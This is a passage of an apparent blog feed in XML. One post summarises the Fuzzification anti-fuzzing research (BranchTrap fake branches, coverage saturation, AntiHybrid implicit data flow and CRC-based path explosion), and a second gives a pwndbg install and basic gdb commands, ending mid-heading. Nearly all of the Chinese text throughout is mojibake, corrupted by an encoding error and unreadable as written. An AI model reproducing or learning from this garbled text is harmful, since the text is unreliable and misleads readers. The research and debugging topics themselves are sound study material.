è¦†ç›–ç‡ä¿¡æ¯è¢«æ¨¡ç³Šå™¨å¹¿æ³›ç”¨äºå¯»æ‰¾æ„Ÿå…´è¶£çš„è¾“å…¥å¹¶å¯¹å…¶è¿›è¡Œæ’åºã€‚å¦‚æœå¯ä»¥æ’å…¥å¤§é‡çš„æ¡ä»¶åˆ†æ”¯ï¼Œè¿™äº›åˆ†æ”¯çš„æ¡ä»¶å¯¹å¾®å°çš„è¾“å…¥å˜åŒ–å¾ˆæ•æ„Ÿï¼Œé‚£ä¹ˆå°±å¯ä»¥è®©è¿™äº›æ¨¡ç³Šå™¨å‹¤å¥‹åœ°å·¥ä½œã€‚å½“æ¨¡ç³Šè¿‡ç¨‹é™·å…¥è¿™äº›åˆ†æ”¯é™·é˜±æ—¶ï¼ŒåŸºäºè¦†ç›–ç‡åé¦ˆçš„æ¨¡ç³Šå™¨å°†æµªè´¹ä»–ä»¬çš„èµ„æºå»æ¢ç´¢(å¤§é‡)æ¯«æ— ä»·å€¼çš„è·¯å¾„ã€‚å› æ­¤ï¼Œä½œè€…æå‡ºäº†ä¸€ç§é€šè¿‡è¯¯å¯¼æˆ–é˜»æ–­è¦†ç›–ç‡åé¦ˆæ¥æ¬ºéª—åŸºäºè¦†ç›–ç‡åé¦ˆçš„fuzzå·¥å…·çš„æŠ€æœ¯ã€‚</p><h4 id="åˆ¶é€ å¤§é‡çš„æ¡ä»¶åˆ†æ”¯å’Œé—´æ¥è·³è½¬"><a class="markdownIt-Anchor" href="#åˆ¶é€ å¤§é‡çš„æ¡ä»¶åˆ†æ”¯å’Œé—´æ¥è·³è½¬"></a> åˆ¶é€ å¤§é‡çš„æ¡ä»¶åˆ†æ”¯å’Œé—´æ¥è·³è½¬</h4><ul><li><p><code>BranchTrap</code><strong>ç¬¬ä¸€ç§æ–¹æ³•</strong>æ˜¯<strong>åˆ¶é€ å¤§é‡çš„æ¡ä»¶åˆ†æ”¯å’Œé—´æ¥è·³è½¬</strong>ï¼Œå¹¶å°†å®ƒä»¬æ³¨å…¥åˆ°åŸå§‹ç¨‹åºä¸­ã€‚</p><p>æ¯ä¸ªè™šæ„çš„æ¡ä»¶åˆ†æ”¯éƒ½ä¾èµ–äºä¸€äº›è¾“å…¥å­—èŠ‚æ¥å†³å®šæ˜¯å¦æ¥å—åˆ†æ”¯ï¼Œè€Œé—´æ¥è·³è½¬åˆ™åŸºäºç”¨æˆ·è¾“å…¥è®¡ç®—å®ƒä»¬çš„ç›®æ ‡ã€‚</p><p>å› æ­¤ï¼Œå³ä½¿è¾“å…¥ç¨æœ‰å˜åŒ–ï¼Œç¨‹åºä¹Ÿä¼šé‡‡ç”¨ä¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚ä¸€æ—¦æ¨¡ç³Šæ‰§è¡Œè§¦å‘ä¼ªé€ çš„åˆ†æ”¯ï¼Œæ¨¡ç³Šå™¨å°†è®¾ç½®ä¸€ä¸ªæ›´é«˜çš„ä¼˜å…ˆçº§æ¥çªå˜å…¶è¾“å…¥ï¼Œå¯¼è‡´æ£€æµ‹æ›´å¤šçš„å‡è·¯å¾„ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œfuzzerå°†ç»§ç»­æµªè´¹å®ƒçš„èµ„æº(ä¾‹å¦‚ï¼ŒCPUå’Œå†…å­˜)å»æ£€æŸ¥æ²¡æœ‰ç»“æœä½†æ²¡æœ‰bugçš„å‡è·¯å¾„ã€‚</p><p>ä¸ºäº†æœ‰æ•ˆåœ°è¯±å¯¼èšç„¦äºå‡åˆ†æ”¯çš„æ¨¡ç³Šå™¨ï¼Œä½œè€…è€ƒè™‘äº†ä»¥ä¸‹å››ä¸ª<strong>è®¾è®¡æ–¹é¢</strong>ï¼š</p><ul><li>é¦–å…ˆï¼ŒBranchTrapåº”è¯¥åˆ¶é€ è¶³å¤Ÿæ•°é‡çš„å‡è·¯å¾„æ¥å½±å“æ¨¡ç³Šç­–ç•¥ã€‚ç”±äºæ¨¡ç³Šå™¨ä¼šä»ä¸€ä¸ªæœ‰è¶£çš„è¾“å…¥äº§ç”Ÿå„ç§ä¸åŒçš„å˜é‡ï¼Œå‡è·¯å¾„åº”è¯¥æä¾›ä¸åŒçš„è¦†ç›–èŒƒå›´ï¼Œå¹¶ç›´æ¥å—åˆ°è¾“å…¥çš„å½±å“ï¼Œä»¥ä¾¿æ¨¡ç³Šå™¨ç»§ç»­æŒ–æ˜é™·é˜±ã€‚</li><li>å…¶æ¬¡ï¼Œæ³¨å…¥çš„æ–°è·¯å¾„ç»™å¸¸è§„æ‰§è¡Œå¸¦æ¥æœ€å°çš„å¼€é”€ã€‚</li><li>ç¬¬ä¸‰ï¼Œbranchtrapä¸­çš„è·¯å¾„å¯¹äºç”¨æˆ·è¾“å…¥åº”è¯¥æ˜¯ç¡®å®šæ€§çš„ï¼Œè¿™æ„å‘³ç€ç›¸åŒçš„è¾“å…¥åº”è¯¥ç»è¿‡ç›¸åŒçš„è·¯å¾„ã€‚åŸå› æ˜¯ä¸€äº›æ¨¡ç³Šå™¨å¯ä»¥æ£€æµ‹å¹¶å¿½ç•¥éç¡®å®šæ€§è·¯å¾„(ä¾‹å¦‚ï¼ŒAFLå¿½ç•¥ä¸€ä¸ªè¾“å…¥ï¼Œå¦‚æœä¸¤ä¸ªè¾“å…¥æ‰§è¡Œé‡‡ç”¨ä¸åŒçš„è·¯å¾„)ã€‚</li><li>æœ€åï¼Œbranchtrapä¸èƒ½è¢«å¯¹æ‰‹è½»æ˜“åœ°è¯†åˆ«æˆ–åˆ é™¤ã€‚</li></ul><p>BranchTrapçš„<strong>ä¸€ä¸ªç®€å•å®ç°</strong>æ˜¯æ³¨å…¥ä¸€ä¸ª<strong>è·³è½¬è¡¨</strong>ï¼Œå¹¶ä½¿ç”¨ä¸€äº›è¾“å…¥å­—èŠ‚ä½œä¸ºè®¿é—®è¯¥è¡¨çš„ç´¢å¼•ã€‚ä¸ºäº†å¼ºåŒ–BranchTrapï¼Œä½œè€…æ ¹æ®ç”¨æˆ·è¾“å…¥ä½¿æ¯ä¸ªæ³¨å…¥çš„åˆ†æ”¯çš„è¿”å›åœ°å€å¤šæ ·åŒ–ã€‚å—ROPçš„å¯å‘ï¼šé€šè¿‡é“¾æ¥å„ç§å°çš„ä»£ç æ®µï¼Œå°†ç°æœ‰ä»£ç é‡ç”¨äºæ¶æ„æ”»å‡»ã€‚ä½œè€…çš„æ–¹æ³•å¯èƒ½ä¼šä¸¥é‡æ‰­æ›²CFG(control flow graph)ï¼Œä½¿å–æ¶ˆBranchTrapæ›´å…·æŒ‘æˆ˜æ€§ã€‚</p><p>å®æ–½è¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ª<strong>æ­¥éª¤</strong>ï¼š</p><ul><li><p>é¦–å…ˆï¼ŒBranchTrapä»ç¨‹åºæ±‡ç¼–ä»£ç ä¸­æ”¶é›†å‡½æ•°ç»“å°¾ï¼ˆfunction epiloguesï¼‰ã€‚</p></li><li><p>å…¶æ¬¡ï¼Œå°†å…·æœ‰ç›¸åŒæŒ‡ä»¤åºåˆ—çš„å‡½æ•°ç»“å°¾åˆ†ç»„åˆ°ä¸€ä¸ªè·³è½¬è¡¨ä¸­</p></li><li><p>ç¬¬ä¸‰ï¼Œé‡å†™ç¨‹åºé›†ï¼Œä»¥ä¾¿è¯¥å‡½æ•°ä½¿ç”¨ä¸€äº›è¾“å…¥å­—èŠ‚ä½œä¸ºè·³è½¬è¡¨ç´¢å¼•ï¼Œä»ç›¸åº”çš„è·³è½¬è¡¨ä¸­æ£€ç´¢å‡ ä¸ªç­‰æ•ˆçš„ç»“å°¾ï¼Œä»¥å®ç°åŸå§‹å‡½æ•°çš„è¿”å›ã€‚</p></li></ul><p>åŸºäºROPçš„BranchTrapå…·æœ‰ä¸‰ä¸ª<strong>ä¼˜ç‚¹</strong>ï¼š</p><ul><li>Effectiveï¼šæ§åˆ¶æµä¸ç”¨æˆ·è¾“å…¥çªå˜ä¸€èµ·ä¸æ–­æ•æ„Ÿåœ°å˜åŒ–ä»è€Œ<strong>å¼•å…¥è¶³å¤Ÿæ•°é‡çš„æ— æ•ˆè·¯å¾„</strong>ï¼Œä½¿coverage feedbackæ•ˆæœé™ä½ã€‚ä¸”BranchTrap<strong>ä¿è¯è·¯å¾„ç¡®å®šæ€§</strong>ï¼Œä»è€Œä½¿fuzzerä¸ä¼šå¿½ç•¥è¿™äº›ä¼ªé€ è·¯å¾„ã€‚</li><li>Low overheadï¼šè½»é‡çº§çš„æ“ä½œï¼ˆXORï¼›è§£æè·³è½¬åœ°å€ï¼›è·³è½¬åˆ°gadgetï¼‰ä¸ºæ™®é€šç”¨æˆ·é€ æˆçš„å¼€é”€ä½ã€‚</li><li>Robustï¼šåŸºäºROPçš„è®¾è®¡å¤§å¤§å¢åŠ äº†å¯¹æ‰‹è¯†åˆ«æˆ–ä¿®è¡¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å¤æ‚æ€§ã€‚</li></ul><p><img src="/posts/5dd98acd/image-20211202213546213.png" alt="image-20211202213546213"></p></li></ul><h4 id="é¥±å’Œæ¨¡ç³ŠçŠ¶æ€"><a class="markdownIt-Anchor" href="#é¥±å’Œæ¨¡ç³ŠçŠ¶æ€"></a> é¥±å’Œæ¨¡ç³ŠçŠ¶æ€</h4><ul><li><p>BranchTrapçš„<strong>ç¬¬äºŒç§æ–¹æ³•</strong>æ˜¯<strong>é¥±å’Œæ¨¡ç³ŠçŠ¶æ€</strong>ï¼Œè¿™å°†é˜»æ­¢æ¨¡ç³Šå™¨å­¦ä¹ ä»£ç è¦†ç›–çš„è¿›å±•ã€‚</p><p>ä¸è¯±å¯¼æ¨¡ç³Šå™¨èšç„¦äºæ— ç»“æœçš„è¾“å…¥çš„ç¬¬ä¸€ç§æ–¹æ³•ä¸åŒï¼Œè¿™é‡Œçš„ç›®æ ‡æ˜¯é˜²æ­¢æ¨¡ç³Šå™¨å‘ç°çœŸæ­£æœ‰è¶£çš„è¾“å…¥ã€‚ä¸ºäº†å®ç°è¿™ä¸€ç›®æ ‡ï¼Œbranchtrapæ’å…¥å¤§é‡çš„åˆ†æ”¯åˆ°ç¨‹åºä¸­ï¼Œå¹¶åˆ©ç”¨æ¯ä¸ªæ¨¡ç³Šå™¨çš„è¦†ç›–è¡¨ç¤ºæœºåˆ¶æ¥æ©ç›–æ–°çš„å‘ç°ã€‚</p><p>BranchTrapèƒ½å¤Ÿä¸ºä¸€äº›å¾ˆå°‘æœ‰äººè®¿é—®çš„åŸºæœ¬å—å¼•å…¥å¤§é‡ï¼ˆä¾‹å¦‚1ä¸‡åˆ°10ä¸‡ï¼‰ç¡®å®šæ€§åˆ†æ”¯ã€‚ä¸€æ—¦fuzzeråˆ°è¾¾è¿™äº›åŸºæœ¬å—ï¼Œå…¶è¦†ç›–èŒƒå›´è¡¨å°†è¿…é€Ÿå¡«æ»¡ã€‚åœ¨ä¹‹åæ‰§è¡Œä¸­å¤§å¤šæ•°æ–°å‘ç°çš„è·¯å¾„å°†è¢«è§†ä¸ºå·²è®¿é—®ï¼Œå› æ­¤fuzzerå°†å¿½ç•¥å®é™…æœ‰è¶£çš„è¾“å…¥ã€‚ä¾‹å¦‚ï¼ŒAFLç»´æŠ¤ä¸€ä¸ªå›ºå®šå¤§å°çš„ä½å›¾(å³64KB)æ¥è·Ÿè¸ªè¾¹ç¼˜è¦†ç›–ã€‚é€šè¿‡æ’å…¥å¤§é‡ä¸åŒçš„åˆ†æ”¯ï¼Œæ˜¾è‘—å¢åŠ äº†ä½å›¾ç¢°æ’çš„æ¦‚ç‡ï¼Œä»è€Œé™ä½äº†è¦†ç›–ç‡çš„ä¸å‡†ç¡®æ€§</p></li></ul><h3 id="antihybrid"><a class="markdownIt-Anchor" href="#antihybrid"></a> AntiHybrid</h3><p><strong>åŠŸèƒ½ï¼šé˜»ç¢æ±¡ç‚¹åˆ†æå’Œç¬¦å·æ‰§è¡Œã€‚</strong></p><p><strong>ç¬¦å·æ‰§è¡Œç®€ä»‹</strong></p><blockquote><ul><li><p>ç¬¦å·æ‰§è¡Œçš„å…³é”®æ€æƒ³å°±æ˜¯ï¼Œä½¿ç”¨ç¬¦å·å€¼æ¥ä»£æ›¿å…·ä½“å˜é‡ï¼Œæ¥æ¨¡æ‹Ÿæ¯ä¸ªè·¯å¾„æ¥äº§ç”Ÿæ¯ä¸€ä¸ªæ‰§è¡Œçš„å¯èƒ½æ€§ï¼Œå°†æ‰§è¡Œè¯­å¥çš„ç»“æœæ•´åˆæˆè‹¥å¹²æ¡æ•°å­¦è¡¨è¾¾å¼ã€‚å¯¹æŸç»“æœçš„æ•°å­¦è¡¨è¾¾å¼è¿›è¡Œæ±‚è§£ï¼Œå°±èƒ½è·å¾—åˆ°è¾¾è¯¥ç»“æœçš„è·¯å¾„ã€‚</p><p><img src="/posts/5dd98acd/image-20211202214447655.png" alt="image-20211202214447655"></p><p><img src="/posts/5dd98acd/image-20211202214454348.png" alt="image-20211202214454348"></p></li></ul></blockquote><p><strong>æ±¡ç‚¹åˆ†æç®€ä»‹</strong></p><blockquote><p>æ±¡ç‚¹åˆ†æå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªä¸‰å…ƒç»„&lt;sources,sinks,sanitizers&gt;çš„å½¢å¼,å…¶ä¸­,</p><ul><li><p>source å³æ±¡ç‚¹æº,ä»£è¡¨ç›´æ¥å¼•å…¥ä¸å—ä¿¡ä»»çš„æ•°æ®æˆ–è€…æœºå¯†æ•°æ®åˆ°ç³»ç»Ÿä¸­;</p></li><li><p>sinkå³æ±¡ç‚¹æ±‡èšç‚¹,ä»£è¡¨ç›´æ¥äº§ç”Ÿå®‰å…¨æ•æ„Ÿæ“ä½œ(è¿åæ•°æ®å®Œæ•´æ€§)æˆ–è€…æ³„éœ²éšç§æ•°æ®åˆ°å¤–ç•Œ(è¿åæ•°æ®ä¿å¯†æ€§);</p></li><li><p>sanitizerå³æ— å®³å¤„ç†,ä»£è¡¨é€šè¿‡æ•°æ®åŠ å¯†æˆ–è€…ç§»é™¤å±å®³æ“ä½œç­‰æ‰‹æ®µä½¿æ•°æ®ä¼ æ’­ä¸å†å¯¹è½¯ä»¶ç³»ç»Ÿçš„ä¿¡æ¯å®‰å…¨äº§ç”Ÿå±å®³.</p></li></ul><p><img src="/posts/5dd98acd/image-20211202214657941.png" alt="image-20211202214657941"></p><p>æ±¡ç‚¹åˆ†æå°±æ˜¯åˆ†æç¨‹åºä¸­ç”±æ±¡ç‚¹æºå¼•å…¥çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿä¸ç»æ— å®³å¤„ç†,è€Œç›´æ¥ä¼ æ’­åˆ°æ±¡ç‚¹æ±‡èšç‚¹</p></blockquote><p>æ··åˆæ¨¡ç³Šæµ‹è¯•æ–¹æ³•åˆ©ç”¨ç¬¦å·æ‰§è¡Œæˆ–åŠ¨æ€æ±¡ç‚¹åˆ†ææ¥æé«˜æ¨¡ç³Šæµ‹è¯•æ•ˆç‡ã€‚ç„¶è€Œï¼Œ<strong>æ··åˆæ–¹æ³•å…·æœ‰ä¼—æ‰€å‘¨çŸ¥çš„å¼±ç‚¹</strong>ï¼š</p><ul><li><p>ç¬¦å·æ‰§è¡Œå’Œæ±¡ç‚¹åˆ†æéƒ½æ¶ˆè€—å¤§é‡èµ„æºï¼Œä»è€Œé™åˆ¶äº†å®ƒä»¬åˆ†æç®€å•ç¨‹åºçš„èƒ½åŠ›ã€‚</p></li><li><p>ç¬¦å·æ‰§è¡Œå—åˆ°<strong>è·¯å¾„çˆ†ç‚¸</strong>é—®é¢˜çš„é™åˆ¶ã€‚å¦‚æœå¤„ç†ç¬¦å·éœ€è¦å¤æ‚çš„æ“ä½œï¼Œåˆ™ç¬¦å·æ‰§è¡Œå¼•æ“å¿…é¡»è¯¦å°½åœ°æ¢ç´¢å’Œè¯„ä¼°æ‰€æœ‰æ‰§è¡ŒçŠ¶æ€ã€‚è€Œä¸”å¤§å¤šæ•°ç¬¦å·æ‰§è¡Œå¼•æ“éƒ½æ— æ³•è¿è¡Œåˆ°æ‰§è¡Œè·¯å¾„çš„æœ«å°¾ã€‚</p><blockquote><p><img src="/posts/5dd98acd/image-20211202214851909.png" alt="image-20211202214851909"></p></blockquote></li><li><p><strong>DTA</strong>(åŠ¨æ€ç¬¦å·æ‰§è¡Œ)åˆ†æéš¾ä»¥è·Ÿè¸ªéšå¼æ•°æ®ä¾èµ–æ€§ã€‚ä¾‹å¦‚ï¼Œä¸ºè¦†ç›–é€šè¿‡æ§åˆ¶é€šé“çš„æ•°æ®ä¾èµ–æ€§ï¼ŒDTAå¿…é¡»åœ¨æœ‰æ¡ä»¶åˆ†æ”¯ä¹‹åå°†taintå±æ€§ä¸»åŠ¨ä¼ æ’­åˆ°ä»»ä½•å˜é‡ï¼Œä»è€Œä½¿åˆ†ææ›´æ˜‚è´µè€Œç»“æœä¸å¤ªå‡†ç¡®</p></li></ul><h4 id="å¼•å…¥éšå¼æ•°æ®æµä¾èµ–å…³ç³»"><a class="markdownIt-Anchor" href="#å¼•å…¥éšå¼æ•°æ®æµä¾èµ–å…³ç³»"></a> å¼•å…¥éšå¼æ•°æ®æµä¾èµ–å…³ç³»</h4><p>ä½œè€…å°†åŸå§‹ç¨‹åºä¸­çš„æ˜¾å¼æ•°æ®æµ<strong>è½¬æ¢ä¸ºéšå¼æ•°æ®æµ</strong>ï¼Œä»¥é˜»ç¢æ±¡æŸ“åˆ†æã€‚</p><p>fuzzificationé¦–å…ˆè¯†åˆ«åˆ†æ”¯æ¡ä»¶å’Œæœ‰è¶£çš„ä¿¡æ¯sink(ä¾‹å¦‚ï¼Œstrcmp)ï¼Œç„¶åæ ¹æ®å˜é‡ç±»å‹æ³¨å…¥æ•°æ®æµè½¬æ¢ä»£ç ã€‚</p><p>ä¸‹å›¾æ˜¾ç¤ºäº†antihybridçš„ä¸€ä¸ªç¤ºä¾‹åº”ç”¨ç¨‹åºï¼Œå…¶ä¸­<code>array input</code>ç”¨äºç¡®å®šåˆ†æ”¯æ¡ä»¶ï¼Œè€Œstrcmpæ˜¯ä¸€ä¸ªæœ‰è¶£çš„sinkå‡½æ•°ã€‚å› æ­¤ï¼Œfuzzificationä½¿ç”¨éšå¼æ•°æ®æµå¤åˆ¶æ•°ç»„(ç¬¬6-15è¡Œ)å¹¶å°†åŸå§‹å˜é‡æ›¿æ¢ä¸ºæ–°å˜é‡(ç¬¬16è¡Œ)ã€‚ç”±äºè½¬æ¢åçš„éšå¼æ•°æ®æµï¼ŒDTAæŠ€æœ¯ä¸èƒ½è¯†åˆ«å½±å“ç¬¬16è¡Œåˆ†æ”¯æ¡ä»¶çš„æ­£ç¡®è¾“å…¥å­—èŠ‚ã€‚</p><p><img src="/posts/5dd98acd/image-20211202215315995.png" alt="image-20211202215315995"></p><h4 id="çˆ†ç‚¸è·¯å¾„çº¦æŸ"><a class="markdownIt-Anchor" href="#çˆ†ç‚¸è·¯å¾„çº¦æŸ"></a> çˆ†ç‚¸è·¯å¾„çº¦æŸ</h4><p>ä¸ºäº†é˜»æ­¢ä½¿ç”¨ç¬¦å·æ‰§è¡Œçš„æ··åˆæ¨¡ç³Šå™¨ï¼Œfuzzificationæ³¨å…¥å¤šä¸ªä»£ç å—æ¥æœ‰æ„åœ°è§¦å‘è·¯å¾„çˆ†ç‚¸ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œé€šè¿‡æ¯”è¾ƒåŸå§‹æ“ä½œæ•°çš„<strong>å“ˆå¸Œå€¼</strong>æ¥æ›¿æ¢æ¯ä¸ªæ¯”è¾ƒæŒ‡ä»¤ã€‚é‡‡ç”¨å“ˆå¸Œå‡½æ•°æ˜¯å› ä¸ºç¬¦å·æ‰§è¡Œ<strong>æ— æ³•è½»æ¾ç¡®å®š</strong>å…·æœ‰ç»™å®šå“ˆå¸Œå€¼çš„<strong>åŸå§‹æ“ä½œæ•°</strong>ã€‚ç”±äºå“ˆå¸Œå‡½æ•°é€šå¸¸ä¼šåœ¨ç¨‹åºæ‰§è¡Œä¸­å¼•å…¥ä¸å¯å¿½ç•¥çš„å¼€é”€ï¼Œå› æ­¤ä½œè€…åˆ©ç”¨è½»é‡çº§çš„å¾ªç¯å†—ä½™æ ¡éªŒï¼ˆCRCï¼‰å¾ªç¯è¿­ä»£æ¥è½¬æ¢åˆ†æ”¯æ¡ä»¶ä»¥å‡å°‘æ€§èƒ½å¼€é”€ã€‚</p><p><img src="/posts/5dd98acd/image-20211202215806017.png" alt="image-20211202215806017"></p>]]></content>
    
    
    <categories>
      
      <category>è½¯ä»¶å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>è½¯ä»¶å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwndbgçš„å®‰è£…å’Œgdbä½¿ç”¨</title>
    <link href="/posts/eda6b4df/"/>
    <url>/posts/eda6b4df/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€-pwndbgå®‰è£…"><a class="markdownIt-Anchor" href="#ä¸€-pwndbgå®‰è£…"></a> ä¸€ã€pwndbgå®‰è£…</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></div></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹.gdbinitä¸­çš„å†…å®¹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">cat <span class="hljs-string">.gdbinit</span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/eda6b4df/image-20211201173406772.png" alt="image-20211201173406772"></p><p>å¦‚ä½•ä¹‹å‰æ²¡æœ‰å®‰è£…è¿‡åˆ«çš„æ’ä»¶ï¼Œåˆ™åªä¼šæ˜¾ç¤ºæœ‰æœ€åä¸€è¡Œï¼Œå¦‚æœå®‰è£…è¿‡ï¼Œåˆ™å°†å‰é¢çš„æ³¨é‡Šæ‰å³å¯</p><p>æ’ä»¶åŠŸèƒ½éƒ½å·®ä¸å¤šï¼Œé€‰æ‹©ä¸€ä¸ªå³å¯ï¼Œå€’ä¹Ÿä¸å¿…æ¯ä¸ªéƒ½è£…ã€‚æœ€åé€‰äº†pwndbgå•çº¯è§‰å¾—å¥½çœ‹ã€‚</p><p>pwndbgåŸºæœ¬ç•Œé¢å¦‚å›¾ï¼š</p><p><img src="/posts/eda6b4df/image-20211201173706711.png" alt="image-20211201173706711"></p><h2 id="äºŒ-gdbçš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#äºŒ-gdbçš„ä½¿ç”¨"></a> äºŒã€gdbçš„ä½¿ç”¨</h2><h3 id="åŸºæœ¬æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#åŸºæœ¬æŒ‡ä»¤"></a> åŸºæœ¬æŒ‡ä»¤</h3><ul><li><code>help</code> //å¸®åŠ©</li><li><code>i</code> //infoï¼ŒæŸ¥çœ‹ä¸€äº›ä¿¡æ¯ï¼Œåªè¾“å…¥infoå¯ä»¥çœ‹å¯ä»¥æ¥ä»€ä¹ˆå‚æ•°ï¼Œä¸‹é¢å‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨<ul><li><code>i b</code> //<strong>å¸¸ç”¨</strong>ï¼Œinfo break æŸ¥çœ‹æ‰€æœ‰æ–­ç‚¹ä¿¡æ¯ï¼ˆç¼–å·ã€æ–­ç‚¹ä½ç½®ï¼‰</li><li><code>i r</code> //<strong>å¸¸ç”¨</strong>ï¼Œinfo registers æŸ¥çœ‹å„ä¸ªå¯„å­˜å™¨å½“å‰çš„å€¼</li><li><code>i f</code> //info function æŸ¥çœ‹æ‰€æœ‰å‡½æ•°åï¼Œéœ€ä¿ç•™ç¬¦å·</li></ul></li><li><code>show</code> //å’Œinfoç±»ä¼¼ï¼Œä½†æ˜¯æŸ¥çœ‹è°ƒè¯•å™¨çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ï¼š<ul><li>show args //æŸ¥çœ‹å‚æ•°</li></ul></li><li><code>rdi</code> //<strong>å¸¸ç”¨</strong>ï¼Œ+å¯„å­˜å™¨åä»£è¡¨ä¸€ä¸ªå¯„å­˜å™¨å†…çš„å€¼ï¼Œç”¨åœ¨åœ°å€ä¸Šç›´æ¥ç›¸å½“ä¸ä¸€ä¸ªåå…­è¿›åˆ¶å˜é‡</li><li><code>backtrace</code> //æŸ¥çœ‹è°ƒç”¨æ ˆ</li><li><code>q</code> //quit é€€å‡ºï¼Œå¸¸ç”¨</li></ul><h3 id="æ‰§è¡ŒæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ‰§è¡ŒæŒ‡ä»¤"></a> æ‰§è¡ŒæŒ‡ä»¤</h3><ul><li><code>s</code> //s<strong>å•æ­¥æ­¥å…¥</strong>ï¼Œé‡åˆ°è°ƒç”¨è·Ÿè¿›å‡½æ•°ä¸­ï¼Œç›¸å½“äºstep intoï¼Œæºç å±‚é¢çš„ä¸€æ­¥</li><li><code>si</code> //<strong>å¸¸ç”¨</strong>ï¼ŒåŒsï¼Œæ±‡ç¼–å±‚é¢çš„ä¸€æ­¥</li><li><code>n</code> //next,<strong>å•æ­¥è¡¥è¿‡</strong>ï¼Œé‡åˆ°è°ƒç”¨ä¸è·Ÿè¿›ï¼Œç›¸å½“äºstep overï¼Œæºç å±‚é¢çš„ä¸€æ­¥</li><li><code>ni</code> //nexti,<strong>å¸¸ç”¨</strong>ï¼ŒåŒnï¼Œæ±‡ç¼–å±‚é¢çš„ä¸€æ­¥</li><li><code>c</code> //continueï¼Œå¸¸ç”¨ï¼Œç»§ç»­æ‰§è¡Œåˆ°æ–­ç‚¹ï¼Œæ²¡æ–­ç‚¹å°±ä¸€ç›´æ‰§è¡Œä¸‹å»</li><li><code>r</code> //runï¼Œå¸¸ç”¨ï¼Œé‡æ–°å¼€å§‹æ‰§è¡Œ</li><li><code>finish</code>//finish,è¿è¡Œç›´åˆ°å½“å‰å‡½æ•°è¿”å›</li></ul><h3 id="æ–­ç‚¹æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ–­ç‚¹æŒ‡ä»¤"></a> æ–­ç‚¹æŒ‡ä»¤</h3><h4 id="ä¸‹æ™®é€šæ–­ç‚¹æŒ‡ä»¤bbreak"><a class="markdownIt-Anchor" href="#ä¸‹æ™®é€šæ–­ç‚¹æŒ‡ä»¤bbreak"></a> <strong>ä¸‹æ™®é€šæ–­ç‚¹æŒ‡ä»¤b(break)ï¼š</strong></h4><ul><li><code>b *(0x123456)</code> //<strong>å¸¸ç”¨</strong>ï¼Œç»™0x123456åœ°å€å¤„çš„æŒ‡ä»¤ä¸‹æ–­ç‚¹<ul><li>b *$ rebase(0x123456) //$rebase åœ¨è°ƒè¯•å¼€PIEçš„ç¨‹åºçš„æ—¶å€™å¯ä»¥ç›´æ¥åŠ ä¸Šç¨‹åºçš„éšæœºåœ°å€</li></ul></li><li><code>b function_name</code> //<strong>å¸¸ç”¨</strong>ï¼Œç»™å‡½æ•°fun_nameä¸‹æ–­ç‚¹ï¼Œç›®æ ‡æ–‡ä»¶è¦ä¿ç•™ç¬¦å·æ‰è¡Œ</li><li><code>b file_name:fun_name</code></li><li><code>b file_name:15</code> //ç»™file_nameçš„15è¡Œä¸‹æ–­ç‚¹ï¼Œè¦æœ‰æºç æ‰è¡Œ<ul><li><code>b 15</code>//å•ä¸ªæ–‡ä»¶çš„ç¬¬15è¡Œ</li></ul></li><li><code>b +0x10</code> //åœ¨ç¨‹åºå½“å‰åœä½çš„ä½ç½®ä¸‹0x10çš„ä½ç½®ä¸‹æ–­ç‚¹ï¼ŒåŒæ ·å¯ä»¥-0x10ï¼Œå°±æ˜¯å‰0x10</li><li><code>break fun if \$rdi==5</code> //æ¡ä»¶æ–­ç‚¹ï¼Œrdiå€¼ä¸º5çš„æ—¶å€™æ‰æ–­</li></ul><h4 id="åˆ é™¤-ç¦ç”¨æ–­ç‚¹"><a class="markdownIt-Anchor" href="#åˆ é™¤-ç¦ç”¨æ–­ç‚¹"></a> <strong>åˆ é™¤ã€ç¦ç”¨æ–­ç‚¹ï¼š</strong></h4><p>ä½¿ç”¨info break(ç®€å†™: i b)æ¥æŸ¥çœ‹æ–­ç‚¹ç¼–å·</p><ul><li><code>delete 5</code> //<strong>å¸¸ç”¨</strong>ï¼Œåˆ é™¤5å·æ–­ç‚¹ï¼Œç›´æ¥deleteä¸æ¥æ•°å­—åˆ é™¤æ‰€æœ‰</li><li><code>disable 5</code> //<strong>å¸¸ç”¨</strong>ï¼Œç¦ç”¨5å·æ–­ç‚¹</li><li><code>enable 5</code> //å¯ç”¨5å·æ–­ç‚¹</li><li><code>clear</code> //ä¸åŠ å‚æ•°é»˜è®¤æ¸…é™¤å½“å‰å‡½æ•°æ‰€åœ¨è¡Œçš„æ‰€æœ‰æ–­ç‚¹<ul><li><code>clear function</code>//åˆ é™¤è¯¥å‡½æ•°å†…çš„æ‰€æœ‰æ–­ç‚¹</li><li><code>clear line</code>//åˆ é™¤è¯¥è¡Œçš„æ‰€æœ‰æ–­ç‚¹</li></ul></li></ul><h4 id="å†…å­˜æ–­ç‚¹æŒ‡ä»¤watch"><a class="markdownIt-Anchor" href="#å†…å­˜æ–­ç‚¹æŒ‡ä»¤watch"></a> 